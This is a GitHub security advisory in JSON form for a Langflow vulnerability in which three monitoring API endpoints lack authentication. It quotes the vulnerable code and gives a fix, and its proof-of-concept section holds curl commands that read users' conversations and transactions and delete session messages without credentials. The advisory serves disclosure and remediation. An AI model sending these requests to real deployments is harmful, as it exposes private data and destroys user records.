{
  "schema_version": "1.4.0",
  "id": "GHSA-c5cp-vx83-jhqx",
  "modified": "2026-01-02T21:11:50Z",
  "published": "2026-01-02T21:11:50Z",
  "aliases": [
    "CVE-2026-21445"
  ],
  "summary": "Langflow Missing Authentication on Critical API Endpoints",
  "details": "### Summary\nMultiple critical API endpoints in Langflow are missing authentication controls, allowing any unauthenticated user to access sensitive user conversation data, transaction histories, and perform destructive operations including message deletion. This affects endpoints handling personal data and system operations that should require proper authorization.\n\n### Details\nThe vulnerability exists in three API endpoints within `src/backend/base/langflow/api/v1/monitor.py` that are missing the required `dependencies=[Depends(get_current_active_user)]` authentication dependency:\n\n**Affected Endpoints:**\n\n1. **GET `/api/v1/monitor/messages`** (Line 61)\n   ```python\n   @router.get(\"/messages\")  # ❌ Missing authentication\n   async def get_messages(\n       session: DbSession,\n       flow_id: Annotated[UUID | None, Query()] = None,\n       session_id: Annotated[str | None, Query()] = None,\n       # ... other parameters\n   ) -> list[MessageResponse]:\n   ```\n\n2. **GET `/api/v1/monitor/transactions`** (Line 183)\n   ```python\n   @router.get(\"/transactions\")  # ❌ Missing authentication\n   async def get_transactions(\n       flow_id: Annotated[UUID, Query()],\n       session: DbSession,\n       params: Annotated[Params | None, Depends(custom_params)],\n   ) -> Page[TransactionTable]:\n   ```\n\n3. **DELETE `/api/v1/monitor/messages/session/{session_id}`** (Line 165)\n   ```python\n   @router.delete(\"/messages/session/{session_id}\", status_code=204)  # ❌ Missing authentication\n   async def delete_messages_session(\n       session_id: str,\n       session: DbSession,\n   ):\n   ```\n\n**Inconsistency Evidence:**\nOther endpoints in the same file properly implement authentication:\n```python\n@router.get(\"/messages/sessions\", dependencies=[Depends(get_current_active_user)])  # ✅ Properly secured\n@router.delete(\"/messages\", status_code=204, dependencies=[Depends(get_current_active_user)])  # ✅ Properly secured\n```\n\n### PoC\nComplete reproduction steps to demonstrate the vulnerability:\n\n**Prerequisites:**\n1. Start a Langflow server instance\n2. Ensure no authentication headers or API keys are provided\n\n**Reproduction Commands:**\n```bash\n# 1. Access all user conversations without authentication\ncurl http://localhost:7860/api/v1/monitor/messages\n\n# 2. Access transaction history without authentication\ncurl \"http://localhost:7860/api/v1/monitor/transactions?flow_id=00000000-0000-0000-0000-000000000000\"\n\n# 3. Delete user messages by session without authentication\ncurl -X DELETE http://localhost:7860/api/v1/monitor/messages/session/00000000-0000-0000-0000-000000000000\n```\n\n**Expected vs Actual Behavior:**\n- **Expected:** All requests should return `401 Unauthorized` \n- **Actual:** All requests return successful responses with sensitive data or perform destructive operations\n\n### Impact\n\n**Vulnerability Type:** Broken Authentication and Authorization (OWASP Top 10 - A01:2021)\n\n**Severity:** High\n\n**Who is Impacted:**\n- **All Langflow users**: Personal conversation data exposed to unauthorized access\n- **System administrators**: Transaction logs disclosed\n\n**Specific Impacts:**\n1. **Data Breach**: Unauthorized access to user conversations containing potentially sensitive personal information\n2. **Privacy Violation**: Transaction histories and user activity patterns exposed without consent\n3. **Data Destruction**: Malicious actors can delete user conversation histories without authorization\n4. **Compliance Risk**: Potential violations of data protection regulations (GDPR, CCPA, etc.)\n5. **System Intelligence**: Attackers can gather information about system usage patterns and user behavior\n\n**Attack Scenarios:**\n- Malicious users accessing proprietary conversation data\n- Malicious users deleting other users' conversation histories\n- Automated scraping of all user conversations for data harvesting\n- Reconnaissance attacks to understand system architecture and usage patterns\n\n**Recommended Fix:**\nAdd authentication dependencies to all affected endpoints:\n\n```python\n@router.get(\"/messages\", dependencies=[Depends(get_current_active_user)])\n@router.get(\"/transactions\", dependencies=[Depends(get_current_active_user)])\n@router.delete(\"/messages/session/{session_id}\", dependencies=[Depends(get_current_active_user)])\n```\n\n**Environment:**\n- Langflow Version: Current main branch\n- Affected Components: API v1 monitoring endpoints\n- Authentication System: FastAPI dependency injection with `get_current_active_user`\n\n<img width=\"1908\" height=\"1029\" alt=\"25-090901\" src=\"https://github.com/user-attachments/assets/44bd03b4-6ada-45b7-b81b-9cb83747172b\" />",
  "severity": [
    {
      "type": "CVSS_V4",
      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "PyPI",
        "name": "langflow-base"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.5.1"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/langflow-ai/langflow/security/advisories/GHSA-c5cp-vx83-jhqx"
    },
    {
      "type": "WEB",
      "url": "https://github.com/langflow-ai/langflow/commit/3fed9fe1b5658f2c8656dbd73508e113a96e486a"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/langflow-ai/langflow"
    },
    {
      "type": "WEB",
      "url": "https://github.com/langflow-ai/langflow/releases/tag/1.5.1"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-306"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2026-01-02T21:11:50Z",
    "nvd_published_at": null
  }
}